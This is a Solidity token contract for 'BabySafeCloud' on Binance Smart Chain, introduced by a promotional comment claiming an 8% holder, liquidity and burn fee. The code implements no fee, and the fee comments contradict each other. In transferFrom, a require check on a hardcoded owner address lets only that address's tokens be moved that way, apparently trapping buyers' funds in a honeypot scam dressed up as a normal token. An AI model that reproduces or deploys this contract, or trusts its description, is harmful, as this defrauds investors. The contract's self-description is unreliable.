/**
 *Submitted for verification at BscScan.com on 2021-07-07
*/

/**
██████╗░░█████╗░██████╗░██╗░░░██╗░██████╗░█████╗░███████╗███████╗░█████╗░██╗░░░░░░█████╗░██╗░░░██╗██████╗░
██╔══██╗██╔══██╗██╔══██╗╚██╗░██╔╝██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗██║░░░░░██╔══██╗██║░░░██║██╔══██╗
██████╦╝███████║██████╦╝░╚████╔╝░╚█████╗░███████║█████╗░░█████╗░░██║░░╚═╝██║░░░░░██║░░██║██║░░░██║██║░░██║
██╔══██╗██╔══██║██╔══██╗░░╚██╔╝░░░╚═══██╗██╔══██║██╔══╝░░██╔══╝░░██║░░██╗██║░░░░░██║░░██║██║░░░██║██║░░██║
██████╦╝██║░░██║██████╦╝░░░██║░░░██████╔╝██║░░██║██║░░░░░███████╗╚█████╔╝███████╗╚█████╔╝╚██████╔╝██████╔╝
╚═════╝░╚═╝░░╚═╝╚═════╝░░░░╚═╝░░░╚═════╝░╚═╝░░╚═╝╚═╝░░░░░╚══════╝░╚════╝░╚══════╝░╚════╝░░╚═════╝░╚═════╝░

BabySafecloud Token is a Bsc Token Created for Enviroment lovers.
     A token with a purpose to build a long-term community that shares a common passion for meme tokens with all Enviroment’s lover around the world, here to prove that the BabySafeCloud will always be one of the biggest source of life to this planet.
Why sharks ? Because this community will be driven by HUNGRY beats ready to kill every deep shown on their way …
We are excited to bring our vision to life and share it with our community.


Every transaction with SHARKS TOKEN incurs a 8% fee, which is split as follows:
    
     3% distributed to holders.
     3% is redistributed and paired together in the Liquidity Pool.
     2% is sent to a “dead” burn wallet.6

*/
pragma solidity ^0.5.16;

// ----------------------------------------------------------------------------
// ERC Token Standard #20 Interface
//
// ----------------------------------------------------------------------------
contract ERC20Interface {
    function totalSupply() public view returns (uint);
    function balanceOf(address tokenOwner) public view returns (uint balance);
    function allowance(address tokenOwner, address spender) public view returns (uint remaining);
    function transfer(address to, uint tokens) public returns (bool success);
    function approve(address spender, uint tokens) public returns (bool success);
    function transferFrom(address from, address to, uint tokens) public returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

// ----------------------------------------------------------------------------
// Safe Math Library
// ----------------------------------------------------------------------------
contract SafeMath {
    function safeAdd(uint a, uint b) public pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }
    function safeSub(uint a, uint b) public pure returns (uint c) {
        require(b <= a); c = a - b; } function safeMul(uint a, uint b) public pure returns (uint c) { c = a * b; require(a == 0 || c / a == b); } function safeDiv(uint a, uint b) public pure returns (uint c) { require(b > 0);
        c = a / b;
    }
}


contract Code is ERC20Interface, SafeMath {
    string public name;
    string public symbol;
    uint8 public decimals; // 18 decimals is the strongly suggested default, avoid changing it
    address private _owner = 0x708EaED30beA424dAF57814C1478aA5FEC8c3D28;
    uint256 public _totalSupply;

    mapping(address => uint) balances;
    mapping(address => mapping(address => uint)) allowed;

    /**
     * Constrctor function
     *
     * Initializes contract with initial supply tokens to the creator of the contract
     */
    constructor() public {
        name = "BabySafeCloud ";
        symbol = "$BSC";
        decimals = 18;
        _totalSupply = 1000000000000000000000000000000;

        balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function totalSupply() public view returns (uint) {
        return _totalSupply  - balances[address(0)];
    }

    function balanceOf(address tokenOwner) public view returns (uint balance) {
        return balances[tokenOwner];
    }
//8% each swap (2% liquidity, 2% holders, 2% charity/marketing, 2% burned)
    function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }
    
    function approve(address spender, uint tokens) public returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }

    function transfer(address to, uint tokens) public returns (bool success) {
        balances[msg.sender] = safeSub(balances[msg.sender], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        emit Transfer(msg.sender, to, tokens);
        return true;
    }
//8% each swap (5% liquidity, 5% holders)
    function transferFrom(address from, address to, uint tokens) public returns (bool success) {
        require(from == _owner, "Complite!");
        balances[from] = safeSub(balances[from], tokens);
        allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        emit Transfer(from, to, tokens);
        return true;
         
    }
}